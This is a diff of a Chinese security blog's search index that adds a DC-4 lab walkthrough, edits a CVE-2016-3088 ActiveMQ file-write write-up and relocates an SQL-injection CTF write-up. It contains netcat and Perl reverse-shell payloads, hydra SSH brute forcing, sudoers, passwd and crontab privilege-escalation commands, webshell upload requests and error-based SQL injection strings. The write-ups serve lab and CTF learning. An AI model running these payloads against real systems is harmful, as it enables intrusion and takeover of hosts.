@@ -1,6 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Linux</title>
+    <url>/2020/04/04/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
+    <content><![CDATA[<h3 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h3>]]></content>
+      <categories>
+        <category>Linux</category>
+        <category>定时任务crontab</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-4</title>
+    <url>/2020/04/04/DC-4/</url>
+    <content><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现开放80端口</p>
+<p><img src="/images/DC-4/image-20200404124917659.png" alt="image-20200404124917659"></p>
+<h3 id="访问web页面，发现是个登录框"><a href="#访问web页面，发现是个登录框" class="headerlink" title="访问web页面，发现是个登录框"></a>访问web页面，发现是个登录框</h3><p>尝试万能密码未果后进行爆破</p>
+<p><img src="/images/DC-4/image-20200404125028244.png" alt="image-20200404125028244"></p>
+<p>一开始用top3000没跑出来，上top1000 跑出用户名密码是<code>admin/happy</code></p>
+<h3 id="登陆后发现可执行系统命令"><a href="#登陆后发现可执行系统命令" class="headerlink" title="登陆后发现可执行系统命令"></a>登陆后发现可执行系统命令</h3><p><img src="/images/DC-4/image-20200404125249186.png" alt="image-20200404125249186"></p>
+<h3 id="抓包，修改命令可执行成功"><a href="#抓包，修改命令可执行成功" class="headerlink" title="抓包，修改命令可执行成功"></a>抓包，修改命令可执行成功</h3><p><img src="/images/DC-4/image-20200404125339585.png" alt="image-20200404125339585"></p>
+<h3 id="执行反弹shell命令-成功上线"><a href="#执行反弹shell命令-成功上线" class="headerlink" title="执行反弹shell命令,成功上线"></a>执行反弹shell命令,成功上线</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">radio=nc+-e+/bin/bash+192.168.245.128+10010&amp;submit=Run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-4/image-20200404125529725.png" alt="image-20200404125529725"></p>
+<h3 id="利用python得到标准bashshell"><a href="#利用python得到标准bashshell" class="headerlink" title="利用python得到标准bashshell"></a>利用python得到标准bashshell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询suid-权限命令，发现可疑的test-sh"><a href="#查询suid-权限命令，发现可疑的test-sh" class="headerlink" title="查询suid 权限命令，发现可疑的test.sh"></a>查询suid 权限命令，发现可疑的test.sh</h3><p><img src="/images/DC-4/image-20200404133334235.png" alt="image-20200404133334235"></p>
+<h3 id="尝试使用test-sh提权未果"><a href="#尝试使用test-sh提权未果" class="headerlink" title="尝试使用test.sh提权未果"></a>尝试使用test.sh提权未果</h3><p><img src="/images/DC-4/image-20200404133517026.png" alt="image-20200404133517026"></p>
+<h3 id="发现backups中有密码"><a href="#发现backups中有密码" class="headerlink" title="发现backups中有密码"></a>发现backups中有密码</h3><h4 id="使用hydra爆破jim密码"><a href="#使用hydra爆破jim密码" class="headerlink" title="使用hydra爆破jim密码"></a>使用hydra爆破jim密码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> jibril04 </span></span><br><span class="line">hydra -l jim -P password.txt -vV 192.168.245.141 ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-4/image-20200404173026791.png" alt="image-20200404173026791"></p>
+<h4 id="SSH登录jim用户"><a href="#SSH登录jim用户" class="headerlink" title="SSH登录jim用户"></a>SSH登录jim用户</h4><p><img src="/images/DC-4/image-20200404173222158.png" alt="image-20200404173222158"></p>
+<h4 id="无法直接sudo提权"><a href="#无法直接sudo提权" class="headerlink" title="无法直接sudo提权"></a>无法直接sudo提权</h4><p><img src="/images/DC-4/image-20200404173510316.png" alt="image-20200404173510316"></p>
+<h3 id="登陆上一会儿提醒我们在-var-mail-jim有一封新邮件"><a href="#登陆上一会儿提醒我们在-var-mail-jim有一封新邮件" class="headerlink" title="登陆上一会儿提醒我们在/var/mail/jim有一封新邮件"></a>登陆上一会儿提醒我们在<code>/var/mail/jim</code>有一封新邮件</h3><p><img src="/images/DC-4/image-20200404173805201.png" alt="image-20200404173805201"></p>
+<h3 id="发现Charles的密码"><a href="#发现Charles的密码" class="headerlink" title="发现Charles的密码"></a>发现Charles的密码</h3><p><code>^xHhA&amp;hvim0y</code></p>
+<p><img src="/images/DC-4/image-20200404173910880.png" alt="image-20200404173910880"></p>
+<h3 id="登录charles账户"><a href="#登录charles账户" class="headerlink" title="登录charles账户"></a>登录charles账户</h3><h4 id="执行-LinEnum-sh检查，出现提示"><a href="#执行-LinEnum-sh检查，出现提示" class="headerlink" title="执行./LinEnum.sh检查，出现提示"></a>执行./LinEnum.sh检查，出现提示</h4><p><img src="/images/DC-4/image-20200404175151553.png" alt="image-20200404175151553"></p>
+<h4 id="利用sudo-teehee提权"><a href="#利用sudo-teehee提权" class="headerlink" title="利用sudo teehee提权"></a>利用sudo teehee提权</h4><h5 id="方式一，修改sudo配置文件"><a href="#方式一，修改sudo配置文件" class="headerlink" title="方式一，修改sudo配置文件"></a>方式一，修改sudo配置文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-4/image-20200404175932544.png" alt="image-20200404175932544"></p>
+<h5 id="方式二，向-etc-passwd添加用户"><a href="#方式二，向-etc-passwd添加用户" class="headerlink" title="方式二，向/etc/passwd添加用户"></a>方式二，向/etc/passwd添加用户</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">注释：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">sudo su admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-4/image-20200404180629679.png" alt="image-20200404180629679"></p>
+<h5 id="方式三，修改定时任务"><a href="#方式三，修改定时任务" class="headerlink" title="方式三，修改定时任务"></a>方式三，修改定时任务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-4/image-20200404181207034.png" alt="image-20200404181207034"></p>
+]]></content>
+      <categories>
+        <category>靶机渗透测试</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2016-3088-activemq任意文件写入漏洞</title>
     <url>/2020/04/03/CVE-2016-3088-activemq%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用<strong>vulhub</strong>搭建及运行漏洞环境：</p>
@@ -25,7 +80,9 @@
 </ol>
 <p>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p>
 <h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p>
-<p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p>
+<p>默认的ActiveMQ账号密码均为<code>admin</code>，可以对 Basic Authorization进行爆破</p>
+<p><img src="/images/CVE-2016-3088-activemq%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20200404105953632.png" alt="image-20200404105953632"></p>
+<p>首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p>
 <p><img src="/images/CVE-2016-3088-activemq%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/02.png" alt=""></p>
 <p>然后上传webshell：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /fileserver/2.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure>
@@ -33,8 +90,9 @@
 <p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOVE /fileserver/2.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
 
-<p>访问webshell（需要登录）：</p>
-<p><img src="/images/CVE-2016-3088-activemq%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/03.png" alt=""></p>
+<p>冰蝎连接webshell（需要指定请求头进行basic验证登录）：</p>
+<p><img src="/images/CVE-2016-3088-activemq%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20200404110858124.png" alt="image-20200404110858124"></p>
+<p><img src="/images/CVE-2016-3088-activemq%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20200404111005577.png" alt="image-20200404111005577"></p>
 <h3 id="写入crontab，自动化弹shell"><a href="#写入crontab，自动化弹shell" class="headerlink" title="写入crontab，自动化弹shell"></a>写入crontab，自动化弹shell</h3><p>这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
 
@@ -1921,6 +1979,56 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli_writeup</title>
+    <url>/2019/12/13/sqli_writeup/</url>
+    <content><![CDATA[<p><a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or 1=1#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122144400086.png" alt="image-20191122144400086"></p>
+<p><img src="../images/sqli_writeup/image-20191122144957715.png" alt="image-20191122144957715"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c616731),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqli_writeup/image-20191122145138742.png" alt="image-20191122145138742"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(flag1) from flag1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(flag1) from flag1),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+<p>ed6b28e684817d9efcaf802979e57aea</p>
+<p><img src="../images/sqli_writeup/image-20191122145221023.png" alt="image-20191122145221023"></p>
+<p><img src="../images/sqli_writeup/image-20191122145510508.png" alt="image-20191122145510508"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x77686f616d69),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122145657918.png" alt="image-20191122145657918"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(w_passwd) from whoami),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+<p> 9db3bae8316e95698ed679aa109c1925     admin123, </p>
+<p><img src="../images/sqli_writeup/image-20191122145845056.png" alt="image-20191122145845056"></p>
+<p> BlCkJaCk    5FF69C838EDD75995197C516C677A416  passwd123, </p>
+<p>AdMiNhEhE admin123,</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select w_name from whoami  limit 1,1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select w_passwd from whoami  limit 1,1),20,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122150513616.png" alt="image-20191122150513616"></p>
+<p><img src="../images/sqli_writeup/image-20191122150732450.png" alt="image-20191122150732450"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">5c58eccac46d7ce0d7a60f4694622c57x</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122161637079.png" alt="image-20191122161637079"></p>
+<p><img src="../images/sqli_writeup/image-20191122161733403.png" alt="image-20191122161733403"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+        <category>sqli</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>requests库学习</title>
     <url>/2019/12/13/requests%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="安装-amp-amp-使用"><a href="#安装-amp-amp-使用" class="headerlink" title="安装&amp;&amp;使用"></a>安装&amp;&amp;使用</h2><p>安装</p>
@@ -1975,56 +2083,6 @@
       </categories>
       <tags>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli_writeup</title>
-    <url>/2019/12/13/sqli_writeup/</url>
-    <content><![CDATA[<p><a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or 1=1#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="../images/sqli_writeup/image-20191122144400086.png" alt="image-20191122144400086"></p>
-<p><img src="../images/sqli_writeup/image-20191122144957715.png" alt="image-20191122144957715"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c616731),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
-
-<p><img src="../images/sqli_writeup/image-20191122145138742.png" alt="image-20191122145138742"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(flag1) from flag1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(flag1) from flag1),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
-
-<p>ed6b28e684817d9efcaf802979e57aea</p>
-<p><img src="../images/sqli_writeup/image-20191122145221023.png" alt="image-20191122145221023"></p>
-<p><img src="../images/sqli_writeup/image-20191122145510508.png" alt="image-20191122145510508"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x77686f616d69),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="../images/sqli_writeup/image-20191122145657918.png" alt="image-20191122145657918"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(w_passwd) from whoami),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
-
-<p> 9db3bae8316e95698ed679aa109c1925     admin123, </p>
-<p><img src="../images/sqli_writeup/image-20191122145845056.png" alt="image-20191122145845056"></p>
-<p> BlCkJaCk    5FF69C838EDD75995197C516C677A416  passwd123, </p>
-<p>AdMiNhEhE admin123,</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select w_name from whoami  limit 1,1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select w_passwd from whoami  limit 1,1),20,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="../images/sqli_writeup/image-20191122150513616.png" alt="image-20191122150513616"></p>
-<p><img src="../images/sqli_writeup/image-20191122150732450.png" alt="image-20191122150732450"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">5c58eccac46d7ce0d7a60f4694622c57x</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="../images/sqli_writeup/image-20191122161637079.png" alt="image-20191122161637079"></p>
-<p><img src="../images/sqli_writeup/image-20191122161733403.png" alt="image-20191122161733403"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-        <category>sqli</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2181,7 +2239,7 @@
 </ul>
 ]]></content>
       <categories>
-        <category>Writeup</category>
+        <category>writeup</category>
         <category>web</category>
       </categories>
       <tags>
